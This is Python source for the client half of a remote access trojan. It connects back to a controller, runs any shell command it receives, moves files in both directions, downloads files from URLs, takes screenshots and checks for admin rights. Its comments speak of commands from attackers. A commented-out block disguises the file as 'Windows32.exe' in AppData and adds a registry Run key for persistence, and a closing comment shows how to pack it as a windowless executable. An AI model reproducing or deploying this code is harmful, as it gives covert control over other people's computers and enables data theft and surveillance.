from socket import *
from termcolor import colored
import os
import subprocess
import sys
import json 
import base64
import shutil
import time
import requests
import wget
import ctypes 
import pyautogui

class Client:
    def __init__(self):
        #initialize a socket on client side
        self.client_socket=0
        print(colored('[+] A socket created successfully!','green'))

    def retry_Connection(self,attempts,sleep_time):
        ## try to establish connection to server after booting or launching
        cnt = 0 
        self.client_socket = socket(AF_INET,SOCK_STREAM)
        while cnt < attempts: 
            try:
                self.client_socket.connect(('localhost',2222)) 
                print(colored("[+] Connect to server successfully!",'green'))
                return True 
            except Exception as e:         
                print("[-] A failed conection : "+str(e))
                cnt = cnt + 1
                time.sleep(sleep_time)
        return False                
    
    def is_admin(self):
        ## check whether a user is admin?
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def download_file_fromInternet(self,Url):
        ## downloading file function 
        try:
            fileName = wget.download(url=Url)
        except: 
            print(colored("[-] An Error has occured during downloading the file from internet",'red'))
            return
        print(colored("[+] Download the file successfully!",'blue'))

    def change_Directory(self,arg):
        ## change working directory
        os.chdir(arg)
        return '[+] Current directory: {}'.format(arg)
    
    def execute_system_command(self,command):
        ## execute command on remote system in background
        return subprocess.check_output(command,shell=True)
   
    def send_data(self,data):
        ## convert data to json and bytes finally
        json_data = json.dumps(data)
        self.client_socket.send(json_data.encode())

    def reveive_data(self): 
        ### receive data function from server
        data = b""
        while True: 
            try:
                ## waiting for enough content from client
                data = data + self.client_socket.recv(1024)
                return json.loads(data.decode())
            except ValueError:
                continue

    def read_file(self,path):
        with open(path,'rb') as output:
            return base64.b64encode(output.read())
        
    def write_file(self,path,content):
        with open(path,'wb') as output:
            output.write(base64.b64decode(content.encode()))
            return "[+] write data to file successfully!"
        return "[-] failed to write data to file !"
    def start_program(self,path):
        ## launch a program
        subprocess.check_call(path,shell=True)

    def screenshot(self):
        save_as = 'screenshot.png'
        screenshot = pyautogui.screenshot()
        screenshot.save(save_as)
        return os.getcwd()+"\\"+save_as
    
    ## starting point
    def run(self):
        result = ""
        while True: 
            command = self.reveive_data()
            try:
                if command == 'exit':
                ## waiting commands from attackers
                    continue
                elif command == 'help':
                    helptions = ["exit : exit the program",
                                 "help: list options",
                                 "cd path: change directory",
                                 "download path: download file from the remote system",
                                 "upload path: upload file to the remote system",
                                 "get url: retrive file from internet",
                                 "check: check whether a user is an admin or not",
                                 "start path: launch a program",
                                 "screenshot: take a screenshot ",
                                 "commands: execute commands"
                                 ]
                    self.send_data(helptions)
                elif command[0] == 'cd' and len(command) > 1:
                    result = self.change_Directory(command[1])
                    self.send_data(result)
                elif command[0] == 'download':
                    content = self.read_file(command[1])
                    ## convert data in bytes to string 
                    self.send_data(content.decode())
                elif command[0] == 'upload':
                    result = self.write_file(command[1],command[2]) 
                    self.send_data(result)
                elif command[0] == 'get':
                    self.download_file_fromInternet(command[1])
                    self.send_data('[+] get file successfully!')
                elif command == 'check':
                    result = "[+] A user is an Admin" if self.is_admin() else "[-] A user is not an Admin"
                    self.send_data(result)
                elif command[0] == 'start':
                    self.start_program(command[1])
                    self.send_data("[+] the program has started!")
                elif command == 'screenshot':
                    path = self.screenshot()
                    result = self.read_file(path)
                    self.send_data(result.decode())
                else: 
                    result = self.execute_system_command(command)
                    ## before send data, convert bytes to string
                    self.send_data(result.decode())
            except Exception as e:
                self.send_data("[-] An Error: "+ str(e))
                continue



## hide and make a persistence on remote system
## find appData varible which is always already on window-based system
# location = os.environ['appData'] + '\\Windows32.exe' 

# if not os.path.exists(location):
#     ## copy file to another location 
#     shutil.copyfile(sys.argv[0],location)
#     subprocess.run("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "'{}'" /f".format(location),shell=True)

clt = Client()
## start session
while True:
    if clt.retry_Connection(1000,10):
        clt.run()
    time.sleep(15)     
    

## convert python to exe file: pyinstaller --onefile --noconsole client.py